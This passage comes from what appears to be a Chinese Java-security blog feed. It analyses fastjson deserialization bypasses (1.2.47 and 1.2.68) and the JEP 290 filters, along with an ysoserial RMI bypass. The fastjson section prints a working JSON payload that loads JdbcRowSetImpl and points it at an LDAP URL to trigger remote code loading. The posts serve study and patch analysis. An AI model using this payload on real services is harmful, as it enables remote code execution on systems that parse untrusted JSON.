也是传进来的参数，parser.parse() 这里面的调用链我就不分析了，简单总结一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DefaultJSONParser#parse()</span><br><span class="line">DefaultJSONParser#parse(Object)</span><br><span class="line">JSONScanner#stringVal()</span><br><span class="line">JSONScanner#subString(int, int)</span><br></pre></td></tr></table></figure><p>JSONScanner#subString(int, int)：</p><img src="/images/image-20240914105410783.png"><p>从 test 中取子串，至于取子串的位置早就设定好了，其实取的是 json 字符串的键名为 val 所对应的值。但是为什么从一开始就这么设定好了呢，这就不得不提到 lexer 这个 JSONScanner 扫描器对象了。</p><h6 id="JSONScanner-扫描器"><a href="#JSONScanner-扫描器" class="headerlink" title="JSONScanner 扫描器"></a>JSONScanner 扫描器</h6><p>早在 JSON#parse 方法创建 DefaultJSONParser 对象的时候就创建了这个 JSONScanner 对象：</p><img src="/images/image-20240914110613836.png"><p>跟进去看构造方法：</p><img src="/images/image-20240914110912950.png"><p>注意这里的 input 就是我们最初传入的 json 字符串。在 JSONScanner 的构造方法中被赋值到 JSONScanner 对象的 test 属性中：</p><img src="/images/image-20240914111737715.png"><p>那么 test 的赋值搞清楚了。看 JSONScanner#stringVal() ：</p><img src="/images/image-20240914112022431.png"><p>这其中代表起始地址与长度的 np、sp 又是在何处赋值呢？</p><p>其实是 lexer.nextToken() 方法在改变 np、sp 的值，也就是 JSONScanner 的父类 JSONLexerBase 的 nextToken() 方法。</p><p>nextToken 会将 JSON 中的<strong>键</strong>或<strong>值</strong>解析成独立的词法单元。例如，在解析 JSON 对象 <code>&#123;&quot;name&quot;: &quot;John&quot;, &quot;age&quot;: 30&#125;</code> 时，<code>nextToken</code> 依次识别并解析以下词法单元：</p><ul><li><code>&#123;</code>：表示对象的开始，词法单元类型为 <code>LBRACE</code></li><li><code>&quot;name&quot;</code>：字符串类型的键，词法单元类型为 <code>STRING</code></li><li><code>:</code>：表示键和值的分隔符，词法单元类型为 <code>COLON</code></li><li><code>&quot;John&quot;</code>：字符串类型的值，词法单元类型为 <code>STRING</code></li><li><code>,</code>：表示下一个键值对的开始，词法单元类型为 <code>COMMA</code></li><li><code>&quot;age&quot;</code>：字符串类型的键，词法单元类型为 <code>STRING</code></li><li><code>:</code>：表示键和值的分隔符，词法单元类型为 <code>COLON</code></li><li><code>30</code>：数字类型的值，词法单元类型为 <code>NUMBER</code></li><li><code>&#125;</code>：表示对象的结束，词法单元类型为 <code>RBRACE</code></li></ul><p>当 nextToken 方法识别到一个词法单元后，词法分析器（lexer）将准备好为下一个 nextToken 调用解析下一个词法单元。</p><p>回过头看 MiscCodec#deserialze(DefaultJSONParser, Type, Object)：</p><img src="/images/image-20240914144929076.png"><p>在做判断的时候判断当前词法单元是不是 “val” ，不是的话会抛出异常，是的话调用 nextToken ，假如 json 数据的格式是：<code>&#123;&quot;val&quot;:&quot;aaaaa&quot;&#125;</code> 这样的形式，调用 nextToken 之后，当前的词法单元就是 <code>:</code> 了。</p><p>然后调用 parser.accept ，这里面其实也调用了 nextToken ，并且在调用之前会检查当前的词法单元是不是 <code>:</code> ：</p><img src="/images/image-20240914145325608.png"><p>那么这个 nextToken 调用完之后，当前的词法单元就是 “val” 键对应的值了。所以 objVal 获取到的就是 val 键对应的值。</p><h6 id="ParserConfig-deserializers-的初始化"><a href="#ParserConfig-deserializers-的初始化" class="headerlink" title="ParserConfig.deserializers 的初始化"></a>ParserConfig.deserializers 的初始化</h6><p>现在回到最初的那个问题：如何将类加载进 TypeUtils.mappings 或者是 ParserConfig.deserializers 。</p><p>接下来看看能否将类加载进 ParserConfig.deserializers 中，但是不能，deserializers 是 ParserConfig 的一个成员属性，定义的时候就初始化好了，并且只有在 ParserConfig#initDeserializers() 中才有添加的操作：</p><img src="/images/image-20240914153242461.png"><p>都是硬编码写好的，没有操作空间，所以不考虑。不过其中有一条，Class 类也在这个里面，这就意味着，如果反序列化的是 java.lang.Class 类，那么它能顺利通过 checkAutoType 的检测。</p><h6 id="剩余利用链分析"><a href="#剩余利用链分析" class="headerlink" title="剩余利用链分析"></a>剩余利用链分析</h6><p>DefaultJSONParser#parseObject(final Map, Object) 方法在遇到 Class 这样的类时，会调用 MiscCodec 类来反序列化它们，并且前面还会设置好 resolveStatus 为 TypeNameRedirect ，这就满足了 MiscCodec#deserialze 中给 objVal 赋值的条件：</p><img src="/images/image-20240914155926713.png"><p>DefaultJSONParser#parseObject(final Map, Object) 这个方法很有意思，遇到不同的类还会调用不同的类来处理它，比如遇到 Class 类调用 MiscCodec 类来反序列化，这应该就是在前面的 ParserConfig#initDeserializers() 中指定的。</p><h6 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h6><p>这部分思路理清了之后，给出一个 payload ：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;object1&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;object2&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:10389/Command8&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>反序列化第一个类时，Class 能顺利通过 checkAutoType 的检查并返回，随后进入 MiscCodec#deserialze 中将 “com.sun.rowset.JdbcRowSetImpl” 字符串加载进 TypeUtils.mappings 。</p><p>反序列化第二个类的时候，由于 TypeUtils.mappings 中存在 “com.sun.rowset.JdbcRowSetImpl” ，即使黑名单匹配到了也不会抛出异常，并且能够成功返回。</p><h6 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h6><p>1.2.48 版本对这种利用方式进行了修复，首先就是将 TypeUtils 的两参 loadClass 方法调用三参方法时的 cache 默认设置为 false ：</p><img src="/images/image-20240917152927051.png"><p>这样就没有办法将类加载进 TypeUtils.mappings 了。</p><p>另一个更改的点就是 MiscCodec#deserialze(DefaultJSONParser, Type, Object) 直接调用 TypeUtils 的三参 loadClass 方法，并且将 cache 设置为 false ：</p><img src="/images/image-20240917153627744.png"><p>最后一个点就是似乎将 java.lang.Class 类加入黑名单了，当我调试到 ParserConfig#checkAutoType 时，第一次进入就直接抛出异常：</p><img src="/images/image-20240917154257933.png"><p>大概是将 java.lang.Class 类加入黑名单了。</p><h4 id="fastjson-1-2-68"><a href="#fastjson-1-2-68" class="headerlink" title="fastjson 1.2.68"></a>fastjson 1.2.68</h4><p>影响版本：<code>fastjson &lt;= 1.2.68</code> </p><p>fastjson 1.2.68 版本在 ParserConfig 中新增了一个 safeMode 安全机制。在其 checkAutoType 方法中：</p><img src="/images/image-20240917155422586.png"><p>只要当前开启了安全模式 safeMode ，那么就会直接抛出异常，任何类都不能通过检查，那么就不能反序列化任何类。</p><p>另外，在 1.2.68 版本出现了一种新的绕过方式，利用点在 checkAutoType 方法的这个位置，如果能构造一个符合条件的 expectClass ，即要反序列化的类是传入的 expectClass 的子类，那么就能通过 checkAutoType 的检查：</p><img src="/images/image-20240917161426258.png"><p>当然这是在 safeMode 关闭的前提下才能利用。其实这个点在过往的版本中也都有，只是利用方式在 1.2.68 版本才发现而已。</p><p>expectClass 是三参 checkAutoType 方法的参数：</p><img src="/images/image-20240917162353677.png"><p>找一找哪里调用了这个三参 checkAutoType 方法并且将 expectClass 赋值了。</p><p>抛开将 expectClass 设置为 null 的情况，可以找到：</p><ul><li>JavaBeanDeserializer#deserialzeArrayMapping</li><li>JavaBeanDeserializer#deserialze</li><li>ThrowableDeserializer#deserialze</li></ul><img src="/images/image-20240917163558857.png"><p>另外，两参 checkAutoType 也调用了三参 checkAutoType ，但是 expectClass 依然是传入的，而且两参 checkAutoType 被调用的点 expectClass 都是被设置为 null ，所以没有利用价值：</p><img src="/images/image-20240917164133794.png"><h6 id="ThrowableDeserializer-deserialze"><a href="#ThrowableDeserializer-deserialze" class="headerlink" title="ThrowableDeserializer#deserialze"></a>ThrowableDeserializer#deserialze</h6><p>调用点在这里：</p><img src="/images/image-20240917165738561.png"><p>它会将 @type 对应的值传入第一个参数，Throwable.class 作为 expectClass 的值：</p><img src="/images/image-20240917165938185.png"><p>也就是说 @type 对应的类是 Throwable 的子类的话，通过 checkAutoType 的检查。</p><p>然后调用 createException 方法创建异常类：</p><img src="/images/image-20240917170600675.png"><p>跟进 ThrowableDeserializer#createException(String, Throwable, Class&lt;?&gt;)，最后在这里实例化：</p><img src="/images/image-20240917170803935.png"><p>那么核心点就在于找一个 Throwable 的子类，它的 getter&#x2F;setter&#x2F;static block&#x2F;constructor 中有可利用的点，或者其他地方有可利用的链。从这个版本开始，再想要 RCE 就比较难了，大部分情况下考虑对文件的操作以及 SSRF 之类，而且可利用的链通常需要很多依赖。这个就留待后续说明吧。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Fastjson-介绍&quot;&gt;&lt;a href=&quot;#Fastjson-介绍&quot; class=&quot;headerlink&quot; title=&quot;Fastjson 介绍&quot;&gt;&lt;/a&gt;Fastjson 介绍&lt;/h2&gt;&lt;p&gt;Fastjson 是阿里巴巴开发的一个高性能 JSON 解析库，广泛</summary>
      
    
    
    
    <category term="Java 安全" scheme="https://changeyourway.github.io/categories/Java-%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>漏洞篇 - 关于 JEP 290</title>
    <link href="https://changeyourway.github.io/2024/09/08/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-%E5%85%B3%E4%BA%8EJEP290/"/>
    <id>https://changeyourway.github.io/2024/09/08/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-%E5%85%B3%E4%BA%8EJEP290/</id>
    <published>2024-09-08T09:22:02.807Z</published>
    <updated>2024-09-08T09:23:49.106Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JEP-290"><a href="#JEP-290" class="headerlink" title="JEP 290"></a>JEP 290</h2><p>JEP290 是 Java 底层为了缓解反序列化攻击提出的一种解决方案。这是一个针对 JAVA 9 提出的安全特性，但同时对 JDK 6,7,8 都进行了支持，在 JDK 6u141、JDK 7u131、JDK 8u121 版本进行了更新。</p><p>JEP 290 主要提供了以下几个机制：</p><ul><li>用黑白名单的方式限制可反序列化的类；</li><li>限制反序列化的调用深度和复杂度；</li><li>为 RMI export 的对象设置了验证机制；</li><li>提供一个全局过滤器，可以在 properties 或配置文件中进行配置；</li></ul><p>现在使用 JDK 8u392 ，再次运行 ysoserial 中的 payloads&#x2F;JRMPListener 和 exploit&#x2F;JRMPClient ，会爆出如下错误：</p><img src="/images/image-20240908125709750.png"><p>这在我之前的分析文章中也提到过，是由于 JEP 290 机制阻止了我反序列化 HashSet 类。</p><p>从报错信息中，可以发现一个 ObjectInputFilter 接口，其中定义了三种状态，分别是未定义、接受和拒绝：</p><img src="/images/image-20240908125941036.png"><p>另外从报错信息中发现 ObjectInputStream 有一个 filterCheck 方法，这个方法与反序列化的检查相关：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">private void filterCheck(Class&lt;?&gt; clazz, int arrayLength)</span><br><span class="line">        throws InvalidClassException &#123;</span><br><span class="line">    if (serialFilter != null) &#123;</span><br><span class="line">        RuntimeException ex = null;</span><br><span class="line">        ObjectInputFilter.Status status;</span><br><span class="line">        // Info about the stream is not available if overridden by subclass, return 0</span><br><span class="line">        long bytesRead = (bin == null) ? 0 : bin.getBytesRead();</span><br><span class="line">        try &#123;</span><br><span class="line">            status = serialFilter.checkInput(new FilterValues(clazz, arrayLength,</span><br><span class="line">                    totalObjectRefs, depth, bytesRead));</span><br><span class="line">        &#125; catch (RuntimeException e) &#123;</span><br><span class="line">            // Preventive interception of an exception to log</span><br><span class="line">            status = ObjectInputFilter.Status.REJECTED;</span><br><span class="line">            ex = e;</span><br><span class="line">        &#125;</span><br><span class="line">        if (status == null  ||</span><br><span class="line">                status == ObjectInputFilter.Status.REJECTED) &#123;</span><br><span class="line">            // Debug logging of filter checks that fail</span><br><span class="line">            if (Logging.infoLogger != null) &#123;</span><br><span class="line">                Logging.infoLogger.info(</span><br><span class="line">                        &quot;ObjectInputFilter &#123;0&#125;: &#123;1&#125;, array length: &#123;2&#125;, nRefs: &#123;3&#125;, depth: &#123;4&#125;, bytes: &#123;5&#125;, ex: &#123;6&#125;&quot;,</span><br><span class="line">                        status, clazz, arrayLength, totalObjectRefs, depth, bytesRead,</span><br><span class="line">                        Objects.toString(ex, &quot;n/a&quot;));</span><br><span class="line">            &#125;</span><br><span class="line">            InvalidClassException ice = new InvalidClassException(&quot;filter status: &quot; + status);</span><br><span class="line">            ice.initCause(ex);</span><br><span class="line">            throw ice;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // Trace logging for those that succeed</span><br><span class="line">            if (Logging.traceLogger != null) &#123;</span><br><span class="line">                Logging.traceLogger.finer(</span><br><span class="line">                        &quot;ObjectInputFilter &#123;0&#125;: &#123;1&#125;, array length: &#123;2&#125;, nRefs: &#123;3&#125;, depth: &#123;4&#125;, bytes: &#123;5&#125;, ex: &#123;6&#125;&quot;,</span><br><span class="line">                        status, clazz, arrayLength, totalObjectRefs, depth, bytesRead,</span><br><span class="line">                        Objects.toString(ex, &quot;n/a&quot;));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="对于-DGC-的影响"><a href="#对于-DGC-的影响" class="headerlink" title="对于 DGC 的影响"></a>对于 DGC 的影响</h4><p>具体体现在为 DGCImpl 新增了一个 checkInput 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">private static ObjectInputFilter.Status checkInput(ObjectInputFilter.FilterInfo filterInfo) &#123;</span><br><span class="line">    if (dgcFilter != null) &#123;</span><br><span class="line">        ObjectInputFilter.Status status = dgcFilter.checkInput(filterInfo);</span><br><span class="line">        if (status != ObjectInputFilter.Status.UNDECIDED) &#123;</span><br><span class="line">            // The DGC filter can override the built-in white-list</span><br><span class="line">            return status;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (filterInfo.depth() &gt; DGC_MAX_DEPTH) &#123;</span><br><span class="line">        return ObjectInputFilter.Status.REJECTED;</span><br><span class="line">    &#125;</span><br><span class="line">    Class&lt;?&gt; clazz = filterInfo.serialClass();</span><br><span class="line">    if (clazz != null) &#123;</span><br><span class="line">        while (clazz.isArray()) &#123;</span><br><span class="line">            if (filterInfo.arrayLength() &gt;= 0 &amp;&amp; filterInfo.arrayLength() &gt; DGC_MAX_ARRAY_SIZE) &#123;</span><br><span class="line">                return ObjectInputFilter.Status.REJECTED;</span><br><span class="line">            &#125;</span><br><span class="line">            // Arrays are allowed depending on the component type</span><br><span class="line">            clazz = clazz.getComponentType();</span><br><span class="line">        &#125;</span><br><span class="line">        if (clazz.isPrimitive()) &#123;</span><br><span class="line">            // Arrays of primitives are allowed</span><br><span class="line">            return ObjectInputFilter.Status.ALLOWED;</span><br><span class="line">        &#125;</span><br><span class="line">        return (clazz == ObjID.class ||</span><br><span class="line">                clazz == UID.class ||</span><br><span class="line">                clazz == VMID.class ||</span><br><span class="line">                clazz == Lease.class)</span><br><span class="line">                ? ObjectInputFilter.Status.ALLOWED</span><br><span class="line">                : ObjectInputFilter.Status.REJECTED;</span><br><span class="line">    &#125;</span><br><span class="line">    // Not a class, not size limited</span><br><span class="line">    return ObjectInputFilter.Status.UNDECIDED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果定义了外部过滤器 dgcFilter，首先调用它进行判断。外部过滤器的优先级更高。</li><li>使用 DGC_MAX_DEPTH 和 DGC_MAX_ARRAY_SIZE 来限制深度和数组大小。</li><li>只有白名单类（ ObjID，UID，VMID，Lease ）允许被反序列化。</li></ul><p>在 JDK 8u392 版本中，当我们尝试用 exploit&#x2F;JRMPClient 攻击一个 RMI 服务端时，服务端的处理逻辑如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TCPTransport#handleMessages(Connection, boolean)</span><br><span class="line">Transport#serviceCall(RemoteCall)</span><br><span class="line">UnicastServerRef#dispatch(Remote, RemoteCall)</span><br><span class="line">UnicastServerRef#oldDispatch(Remote, RemoteCall, int)</span><br><span class="line">DGCImpl_Skel#dispatch(java.rmi.Remote, java.rmi.server.RemoteCall, int, long)</span><br></pre></td></tr></table></figure><p>然后会在这里调用 ObjectInputStream 的 readObject 方法：</p><img src="/images/image-20240908131631277.png"><p>跟进 ObjectInputStream#readObject() ：</p><img src="/images/image-20240908131836706.png"><p>跟进 ObjectInputStream#readObject(Class&lt;?&gt;)：</p><img src="/images/image-20240908131946393.png"><p>这里会调用 readObject0 方法。</p><p>跟进 ObjectInputStream#readObject0(Class&lt;?&gt;, boolean)， readObject0 是一个用于反序列化 Java 对象的内部方法。它负责从输入流中读取不同类型的对象数据，并根据特定的标记（type codes）进行相应的处理和反序列化操作。当读取到的 type code 为 TC_OBJECT（表示普通对象）时，会进行如下操作：</p><img src="/images/image-20240908132117464.png"><p>跟进 ObjectInputStream#readOrdinaryObject(boolean)，这个方法用于读取并返回普通对象：</p><img src="/images/image-20240908132916215.png"><p>跟进 ObjectInputStream#readClassDesc(boolean) ，这个方法用于返回一个类描述符：</p><img src="/images/image-20240908133220028.png"><p>进入非动态代理类的情况，调用 readNonProxyDesc 来获取类描述符。</p><p>跟进 ObjectInputStream#readNonProxyDesc(boolean) ，经过了一系列操作后，调用了 filterCheck 方法，就是我们一开始提到的那个：</p> <img src="/images/image-20240908133516802.png"><p>跟进 ObjectInputStream#filterCheck(Class&lt;?&gt;, int) ：</p><img src="/images/image-20240908133802354.png"><p>在这里调用 serialFilter.checkInput ，也就是 DGCImpl 的 checkInput 方法，完成闭环。</p><h6 id="调用链总结"><a href="#调用链总结" class="headerlink" title="调用链总结"></a>调用链总结</h6><p>服务端处理的调用链如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DGCImpl_Skel#dispatch(java.rmi.Remote, java.rmi.server.RemoteCall, int, long)</span><br><span class="line">ObjectInputStream#readObject()</span><br><span class="line">ObjectInputStream#readObject(Class&lt;?&gt;)</span><br><span class="line">ObjectInputStream#readObject0(Class&lt;?&gt;, boolean)</span><br><span class="line">ObjectInputStream#readOrdinaryObject(boolean)</span><br><span class="line">ObjectInputStream#readClassDesc(boolean) </span><br><span class="line">ObjectInputStream#readNonProxyDesc(boolean)</span><br><span class="line">ObjectInputStream#filterCheck(Class&lt;?&gt;, int)</span><br><span class="line">DGCImpl#checkInput(ObjectInputFilter.FilterInfo)</span><br></pre></td></tr></table></figure><h4 id="对于-RMI-的影响"><a href="#对于-RMI-的影响" class="headerlink" title="对于 RMI 的影响"></a>对于 RMI 的影响</h4><p>具体体现在为 RegistryImpl 类添加了一个 registryFilter 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">private static ObjectInputFilter.Status registryFilter(ObjectInputFilter.FilterInfo filterInfo) &#123;</span><br><span class="line">    if (registryFilter != null) &#123;</span><br><span class="line">        ObjectInputFilter.Status status = registryFilter.checkInput(filterInfo);</span><br><span class="line">        if (status != ObjectInputFilter.Status.UNDECIDED) &#123;</span><br><span class="line">            // The Registry filter can override the built-in white-list</span><br><span class="line">            return status;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (filterInfo.depth() &gt; REGISTRY_MAX_DEPTH) &#123;</span><br><span class="line">        return ObjectInputFilter.Status.REJECTED;</span><br><span class="line">    &#125;</span><br><span class="line">    Class&lt;?&gt; clazz = filterInfo.serialClass();</span><br><span class="line">    if (clazz != null) &#123;</span><br><span class="line">        if (clazz.isArray()) &#123;</span><br><span class="line">            // Arrays are REJECTED only if they exceed the limit</span><br><span class="line">            return (filterInfo.arrayLength() &gt;= 0 &amp;&amp; filterInfo.arrayLength() &gt; REGISTRY_MAX_ARRAY_SIZE)</span><br><span class="line">                ? ObjectInputFilter.Status.REJECTED</span><br><span class="line">                : ObjectInputFilter.Status.UNDECIDED;</span><br><span class="line">        &#125;</span><br><span class="line">        if (String.class == clazz</span><br><span class="line">                || java.lang.Number.class.isAssignableFrom(clazz)</span><br><span class="line">                || Remote.class.isAssignableFrom(clazz)</span><br><span class="line">                || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)</span><br><span class="line">                || UnicastRef.class.isAssignableFrom(clazz)</span><br><span class="line">                || RMIClientSocketFactory.class.isAssignableFrom(clazz)</span><br><span class="line">                || RMIServerSocketFactory.class.isAssignableFrom(clazz)</span><br><span class="line">                || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz)</span><br><span class="line">                || java.rmi.server.UID.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            return ObjectInputFilter.Status.ALLOWED;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return ObjectInputFilter.Status.REJECTED;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return ObjectInputFilter.Status.UNDECIDED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>如果存在一个全局的 registryFilter，那么会调用它的 checkInput 方法来检查是否允许反序列化当前对象。外部的 registryFilter 拥有高优先级，它可以覆盖接下来定义的内置白名单规则。</p></li><li><p>使用 REGISTRY_MAX_DEPTH 和 REGISTRY_MAX_ARRAY_SIZE 来限制深度和数组大小。</p></li><li><p>以及定义了一个明确的白名单，，如果反序列化对象的类型属于这个白名单中的类，则允许反序列化（ALLOWED）。</p></li></ol><p>其调用链与 DGC 相似，只不过是在 RegistryImpl_Skel 的 dispatch 方法触发。不过值得注意的是，这个方法只对 bind 和 rebind 的处理逻辑有反序列化的操作。</p><p>bind 的处理逻辑：</p><img src="/images/image-20240908144016619.png"><p>rebind 的处理逻辑：</p><img src="/images/image-20240908144053256.png"><p>而对其他方法比如 list、lookup、unbind 的处理逻辑则是没有调用 readObject 方法的。<strong>也就是说这个新增的机制只影响 Server 端对 Registry 端的攻击，对其他的攻击没有影响。具体来说，就是只影响 bind 和 rebind 方法的结果。</strong>之前提到的针对 Server 端和 Client 端的攻击依然可行。</p><h6 id="调用链总结-1"><a href="#调用链总结-1" class="headerlink" title="调用链总结"></a>调用链总结</h6><p>还是总结一下 Registry 端的处理逻辑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">RegistryImpl_Skel#dispatch(java.rmi.Remote, java.rmi.server.RemoteCall, int, long)</span><br><span class="line">ObjectInputStream#readObject()</span><br><span class="line">ObjectInputStream#readObject(Class&lt;?&gt;)</span><br><span class="line">ObjectInputStream#readObject0(Class&lt;?&gt;, boolean)</span><br><span class="line">ObjectInputStream#readOrdinaryObject(boolean)</span><br><span class="line">ObjectInputStream#readClassDesc(boolean)</span><br><span class="line">ObjectInputStream#readProxyDesc(boolean)</span><br><span class="line">ObjectInputStream#filterCheck(Class&lt;?&gt;, int)</span><br><span class="line">RegistryImpl#registryFilter(ObjectInputFilter.FilterInfo)</span><br></pre></td></tr></table></figure><p>除了中间调用的是 readProxyDesc 而不是 readNonProxyDesc 以外，跟 DGC 服务端的处理逻辑大差不差。</p><h4 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a>绕过分析</h4><p>在白名单操作之后，Server 端想要向 Registry 端直接绑定一个 CC 链之类的恶意对象就不行了，但是之前提到的 RemoteObject + UnicastRef 还是可以用的。ysoserial 中的 exploit&#x2F;JRMPListener 和 payloads&#x2F;JRMPClient 就是对这一块的实现。</p><p>JDK 8u202 环境下，如果存在一个 Registry 端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Registry registry = LocateRegistry.createRegistry(1099);</span><br></pre></td></tr></table></figure><p>那么就可以针对它展开攻击：</p><ol><li><p>首先开启 exploit&#x2F;JRMPListener 服务端，它的作用是当收到 DGC 请求时会返回 BadAttributeValueExpException 异常类，与 CC 有关的 payload 就被放置在这个异常类当中。</p></li><li><p>然后我们可以向 Registry 端 bind 一个 UnicastRef 对象，这个对象在白名单之中，它被反序列化时，会向其中指定的地址发起 DGC 调用请求。但是由于绑定的对象必须要继承 Remote 接口，所以利用 RemoteObjectInvocationHandler 为这个 UnicastRef 对象创建一个 Registry 代理类，Registry 继承了 Remote ，所以这个代理类可以被顺利绑定。</p></li><li><p>于是 Registry 端收到 exploit&#x2F;JRMPListener 发来的异常，造成反序列化攻击。</p></li></ol><p>修改后的 payloads&#x2F;JRMPClient 用来实现第二步：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 